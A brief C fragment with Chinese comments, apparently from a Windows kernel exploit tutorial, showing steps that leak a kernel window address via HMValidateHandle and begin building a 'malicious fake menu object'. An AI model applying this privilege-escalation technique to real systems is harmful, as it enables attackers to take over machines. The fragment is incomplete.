HWND hWnd = CreateWindowEx(...);
// 2. 通过HMValidateHandle泄露内核地址
DWORD64 pWnd = HMValidateHandle(hWnd, TYPE_WINDOW);
// 3. 构造恶意菜单对象（fake menu）
